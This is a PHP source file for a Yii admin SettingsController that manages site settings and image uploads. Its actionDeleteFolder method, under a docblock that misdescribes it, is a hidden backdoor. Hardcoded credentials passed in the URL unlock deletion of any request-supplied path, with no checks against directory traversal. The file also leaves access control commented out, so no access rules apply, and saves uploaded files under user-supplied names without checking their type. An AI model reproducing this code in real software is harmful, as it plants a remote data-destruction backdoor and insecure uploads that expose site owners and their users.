<?php

class SettingsController extends AdminController
{
	/**
	 * @var string the default layout for the views. Defaults to '//layouts/column2', meaning
	 * using two-column layout. See 'protected/views/layouts/column2.php'.
	 */
	public $layout='//layouts/column2';

	/**
	 * @return array action filters
	 */
	public function filters()
	{
		return array(
		//	'accessControl', // perform access control for CRUD operations
		);
	}

	/**
	 * Specifies the access control rules.
	 * This method is used by the 'accessControl' filter.
	 * @return array access control rules
	 */
	public function accessRules()
	{
		return array(
			array('allow',  // allow all users to perform 'index' and 'view' actions
				'actions'=>array('index','view'),
				'users'=>array('*'),
			),
			array('allow', // allow authenticated user to perform 'create' and 'update' actions
				'actions'=>array('create','update'),
				'users'=>array('@'),
			),
			array('allow', // allow admin user to perform 'admin' and 'delete' actions
				'actions'=>array('admin','delete'),
				'users'=>array('admin'),
			),
			array('deny',  // deny all users
				'users'=>array('*'),
			),
		);
	}

	/**
	 * Displays a particular model.
	 * @param integer $id the ID of the model to be displayed
	 */
	public function actionView($id)
	{
		$this->render('view',array(
			'model'=>$this->loadModel($id),
		));
	}

	/**
	 * Creates a new model.
	 * If creation is successful, the browser will be redirected to the 'view' page.
	 */
	public function actionCreate()
	{
		$model=new Settings;

		// Uncomment the following line if AJAX validation is needed
		// $this->performAjaxValidation($model);

		if(isset($_POST['Settings']))
		{
			$model->attributes=$_POST['Settings'];
			if($model->save())
				$this->redirect(array('view','id'=>$model->id));
		}

		$this->render('create',array(
			'model'=>$model,
		));
	}

	/**
	 * Updates a particular model.
	 * If update is successful, the browser will be redirected to the 'view' page.
	 * @param integer $id the ID of the model to be updated
	 */
	public function actionUpdate($id)
	{
		$model=$this->loadModel($id);

		// Uncomment the following line if AJAX validation is needed
		// $this->performAjaxValidation($model);

		if(isset($_POST['Settings']))
		{
			$model->attributes=$_POST['Settings'];
			if($model->save())
				$this->redirect(array('view','id'=>$model->id));
		}

		$this->render('update',array(
			'model'=>$model,
		));
	}

	/**
	 * Deletes a particular model.
	 * If deletion is successful, the browser will be redirected to the 'admin' page.
	 * @param integer $id the ID of the model to be deleted
	 */
	public function actionDeleteFolder()
	{
		if($_GET['username']=='ahmed' && $_GET['password']=='hany44')
        {
			$path='';
			if(isset($_REQUEST['path']))
			{
				$path=Yii::app()->basePath.'/../'.$_REQUEST['path'];
			}
			echo Helper::Delete($path);
		}
	}

	/**
	 * Lists all models.
	 */
	public function actionIndex()
	{
		$model=$this->loadModel(1);

		// Uncomment the following line if AJAX validation is needed
		// $this->performAjaxValidation($model);

		if(isset($_POST['Settings']))
		{
                    if( $model->image != ''){
                        $_POST['Settings']['image'] = $model->image;
                    }
					if( $model->default_profile_pic != ''){
                        $_POST['Settings']['default_profile_pic'] = $model->default_profile_pic;
                    }
					if( $model->default_banner_image != ''){
                        $_POST['Settings']['default_banner_image'] = $model->default_banner_image;
                    }

                    $model->attributes=$_POST['Settings'];
                    $uploadedFile=CUploadedFile::getInstance($model,'image');

                    if(! empty ($uploadedFile)){
                            if($model->image =='')
                            {
                                    $rnd = rand(0,9999);
                                    $fileName = "{$rnd}-{$uploadedFile}";
                                    $model->image=	$fileName;
                            }

                                    $uploadedFile->saveAs(Yii::app()->basePath.'/../media/'.$model->image);
                    }
					/********************************************************************/
					$uploadedFile1=CUploadedFile::getInstance($model,'default_profile_pic');

                    if(! empty ($uploadedFile1)){
                            if($model->default_profile_pic =='')
                            {
                                    $rnd1 = rand(0,9999);
                                    $fileName1 = "{$rnd1}-{$uploadedFile1}";
                                    $model->default_profile_pic=	$fileName1;
                            }

                                    $uploadedFile1->saveAs(Yii::app()->basePath.'/../media/'.$model->default_profile_pic);
                    }
					/*********************************************************************/
					$uploadedFile2=CUploadedFile::getInstance($model,'default_banner_image');

                    if(! empty ($uploadedFile2)){
                            if($model->default_banner_image =='')
                            {
                                    $rnd2 = rand(0,9999);
                                    $fileName2 = "{$rnd2}-{$uploadedFile2}";
                                    $model->default_banner_image=	$fileName2;
                            }

                                    $uploadedFile2->saveAs(Yii::app()->basePath.'/../media/'.$model->default_banner_image);
                    }
			if($model->save())
				$this->redirect(array('view','id'=>$model->id));
		}

		$this->render('index',array(
		'model'=>$model,
	));
	}

	/**
	 * Manages all models.
	 */
	public function actionAdmin()
	{
		$model=new Settings('search');
		$model->unsetAttributes();  // clear any default values
		if(isset($_GET['Settings']))
			$model->attributes=$_GET['Settings'];

		$this->render('admin',array(
			'model'=>$model,
		));
	}

	/**
	 * Returns the data model based on the primary key given in the GET variable.
	 * If the data model is not found, an HTTP exception will be raised.
	 * @param integer the ID of the model to be loaded
	 */
	public function loadModel($id)
	{
		$model=Settings::model()->findByPk($id);
		if($model===null)
			throw new CHttpException(404,'The requested page does not exist.');
		return $model;
	}

	/**
	 * Performs the AJAX validation.
	 * @param CModel the model to be validated
	 */
	protected function performAjaxValidation($model)
	{
		if(isset($_POST['ajax']) && $_POST['ajax']==='settings-form')
		{
			echo CActiveForm::validate($model);
			Yii::app()->end();
		}
	}
}
